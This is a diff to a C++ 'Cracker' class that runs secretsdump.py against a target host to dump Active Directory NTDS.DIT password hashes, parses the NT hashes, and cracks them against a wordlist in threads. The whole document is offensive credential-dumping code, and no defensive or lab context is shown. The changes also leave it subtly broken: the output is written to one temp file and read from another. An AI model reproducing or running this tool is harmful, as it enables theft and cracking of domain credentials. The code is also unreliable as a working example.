@@ -16,10 +16,10 @@ using namespace std;
 
 class Cracker {
     public:
-        string ip_address;
-        string username;
-        string password;
-        string target;
+        std::string ip_address;
+        std::string username;
+        std::string password;
+        std::string target;
 
         std::vector<std::string> check_username(const std::string& username) {
             std::vector<std::string> result;
@@ -31,25 +31,50 @@ class Cracker {
 
             if (pos_backslash != std::string::npos && pos_dot != std::string::npos) {
                 // Both backslash and dot found, split the string into three substrings
-                result.push_back(username.substr(0, pos_backslash));
+                std::string domain_name = username.substr(0, pos_backslash);
+                size_t pos_dot_domain_name = domain_name.find('.');
                 size_t pos_last_dot = username.rfind('.');
-                result.push_back(username.substr(pos_backslash + 1, pos_last_dot - pos_backslash - 1));
-                result.push_back(username.substr(pos_last_dot + 1));
-            } else if (pos_backslash != std::string::npos) {
-                // Backslash found, split the string into two substrings
-                result.push_back(username.substr(0, pos_backslash));
-                result.push_back(username.substr(pos_backslash + 1));
-            } else if (pos_dot != std::string::npos) {
-                // Dot found, split the string into two substrings
-                result.push_back(username.substr(0, pos_dot));
-                result.push_back(username.substr(pos_dot + 1));
-            } else {
-                // Neither backslash nor dot found, return the whole string as a single substring
-                result.push_back(username);
-            }
+                if (pos_dot_domain_name != std::string::npos && 
+                    pos_dot_domain_name != pos_last_dot && 
+                    pos_last_dot > pos_backslash) {
+                    // dot found in domain name
+                    result.push_back(domain_name.substr(0, pos_dot_domain_name));
+                                result.push_back(username.substr(pos_backslash + 1, 
+                                                pos_last_dot - pos_backslash - 1));
+                                result.push_back(username.substr(pos_last_dot + 1));
+                    }   
+                    else if (pos_dot_domain_name != std::string::npos && 
+                            pos_dot_domain_name != pos_last_dot && 
+                            pos_last_dot < pos_backslash) {
+                        result.push_back(username.substr(0, pos_dot_domain_name));
+                        result.push_back(username.substr(pos_backslash + 1));
+                    } 
+                    else if (pos_dot_domain_name == std::string::npos && 
+                            pos_last_dot > pos_backslash) {
+                        result.push_back(username.substr(0, pos_backslash));
+                        result.push_back(username.substr(pos_backslash + 1, 
+                                        pos_last_dot - pos_backslash - 1));
+                        result.push_back(username.substr(pos_last_dot + 1));
+                    }
+                }   
+                    else if (pos_backslash != std::string::npos) {
+                    // Backslash found, split the string into two substrings
+                    result.push_back(username.substr(0, pos_backslash));
+                    result.push_back(username.substr(pos_backslash + 1));
+                }   
+                    else if (pos_dot != std::string::npos) {
+                    // Dot found, split the string into two substrings
+                    result.push_back(username.substr(0, pos_dot));
+                    result.push_back(username.substr(pos_dot + 1));
+                }   
+                    else {
+                    // Neither backslash nor dot found, return the whole string as a single substring
+                    result.push_back(username);
+                }
 
             return result;
         }
+
 
 
         std::vector<string> generate(std::string username) {
@@ -92,10 +117,10 @@ class Cracker {
             }
         }
         
-        string get_ntds() {
+        std::string get_ntds() {
             setenv("TARGET", target.c_str(), 1);
             system("/usr/bin/python3 ./vendor/scripts/secretsdump.py \"${TARGET}\" > /tmp/output.txt");
-            ifstream fin("/tmp/output.txt");
+            ifstream fin("/tmp/output2.txt");
             string output = "";
             while (fin) {
                 string line; 
@@ -107,12 +132,10 @@ class Cracker {
 
         std::unordered_map<std::string, std::string> parse_hashes(const std::string& input) {        
             std::unordered_map<std::string, std::string> result;
-            std::regex re("nthash\\)(.*?)\\[\\*\\]");
-            std::regex re_for_dc("NTDS\\.DIT secrets(.*?)\\[\\*\\]");
+            std::regex re("\\(nthash\\)\n(.*)\n\\[\\*\\]");
+            std::regex re_for_dc("NTDS\\.DIT secrets\n(.*?)\n\\[\\*\\]");
             std::string modified_input = input; // Create a non-const copy of the input string
-            std::string helper_for_regex = "\n";
             std::smatch match;
-            size_t pos = 0;
             std::string matched_str;
             std::vector<std::string> split_result;
             std::vector<std::string> split_result_line;
@@ -121,12 +144,7 @@ class Cracker {
             std::istringstream iss("");
             std::istringstream iss_line("");
             std::unordered_map<std::string, std::string> creds;
-        
-            while ((pos = modified_input.find(helper_for_regex, pos)) != std::string::npos) {
-                modified_input.replace(pos, helper_for_regex.length(), "^");
-                pos += 6; // Move past the replaced string
-            }
-            
+
             if (std::regex_search(modified_input, match, re_for_dc)) {
                 matched_str = match[1].str();
             } else {
@@ -135,10 +153,8 @@ class Cracker {
                     matched_str = match[1].str();
                 }
             };
-
             iss.str(matched_str);
-            
-            while (std::getline(iss, token, '^')){
+            while (std::getline(iss, token)){
                 split_result.push_back(token);
             }
 
@@ -193,7 +209,7 @@ class Cracker {
                 threads.emplace_back(
                     &Cracker::crack, this, std::cref(wl), kv.second.c_str(), kv.first.c_str()
                 );
-                if (threads.size() == 10) {
+                if (threads.size() == 1) {
                     for (auto& thread : threads) {
                         thread.join();
                     }
